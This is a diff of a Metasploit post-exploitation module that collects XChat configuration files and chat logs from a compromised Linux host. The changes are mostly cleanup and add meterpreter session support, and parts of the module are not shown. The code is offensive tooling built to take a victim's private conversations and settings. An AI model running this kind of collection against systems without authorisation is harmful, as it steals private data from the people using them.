@@ -1,17 +1,12 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
-require 'msf/core/post/common'
-require 'msf/core/post/file'
 
 class Metasploit3 < Msf::Post
 
-  include Msf::Post::Common
   include Msf::Post::File
 
   def initialize(info={})
@@ -25,11 +20,11 @@ class Metasploit3 < Msf::Post
         .log files.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'linux' ],
+      'Author'        => ['sinn3r'],
+      'Platform'      => ['linux'],
       # linux meterpreter is too busted to support right now,
       # will come back and add support once it's more usable.
-      'SessionTypes'  => [ 'shell' ],
+      'SessionTypes'  => ['shell', 'meterpreter'],
       'Actions'       =>
         [
           ['CONFIGS', { 'Description' => 'Collect XCHAT\'s config files' } ],
@@ -67,7 +62,7 @@ class Metasploit3 < Msf::Post
   end
 
   def whoami
-    user = cmd_exec("whoami").chomp
+    user = cmd_exec("/usr/bin/whoami").chomp
     return user
   end
 
@@ -125,7 +120,7 @@ class Metasploit3 < Msf::Post
     files.each do |f|
       vprint_status("#{@peer} - Downloading: #{base + f}")
       buf = read_file(base + f)
-      next if buf.empty?
+      next if buf.blank?
       config << {
         :filename => f,
         :data     => buf
@@ -144,7 +139,7 @@ class Metasploit3 < Msf::Post
     @peer = "#{session.session_host}:#{session.session_port}"
 
     user = whoami
-    if user.nil?
+    if user.blank?
       print_error("#{@peer} - Unable to get username, abort.")
       return
     end
@@ -154,8 +149,8 @@ class Metasploit3 < Msf::Post
     configs  = get_configs(base)  if action.name =~ /ALL|CONFIGS/i
     chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i
 
-    save(:configs, configs)   if not configs.empty?
-    save(:chatlogs, chatlogs) if not chatlogs.empty?
+    save(:configs, configs)   unless configs.empty?
+    save(:chatlogs, chatlogs) unless chatlogs.empty?
   end
 
 end
